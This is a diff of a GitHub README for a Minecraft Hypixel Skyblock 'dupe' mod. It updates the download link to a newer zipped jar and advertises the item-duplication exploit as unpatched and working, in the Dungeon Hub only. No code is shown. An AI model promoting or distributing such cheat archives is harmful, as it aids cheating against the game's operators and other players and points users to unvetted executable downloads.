@@ -2,15 +2,16 @@
 Hypixel Skyblock GUI Method Dupe Mod
 
 !!!
-Only working in Dungeon Hub right now because of Container ID reasons stop asking why it's not working
+Only working in Dungeon Hub right now because of Container ID reasons stop asking why it's not working anywhere else
 !!! 
 
 Kmod-0.5.6.jar ->
-[Kmod-0.5.6.jar.zip](https://github.com/fatql19/Skyblock-GUI-Mod/files/9174156/Kmod-0.5.6.jar.zip)
-(unpatched - still working - Last tested on 14.08.2022 - only works in dungeon hub for now)
+[Kmod-0.5.7-DungeonHub.zip](https://github.com/fatql19/Skyblock-GUI-Mod/files/9333584/Kmod-0.5.7-DungeonHub.zip)
+
+(UNPATCHED - STILL WORKING - Last tested on 14.08.2022 - ONLY WORKS IN DUNGEON HUB FOR NOW)
 
 !!!
-Only working in Dungeon Hub right now because of Container ID reasons stop asking why it's not working
+Only working in Dungeon Hub right now because of Container ID reasons stop asking why it's not working anywhere else
 !!!
 
 !!!
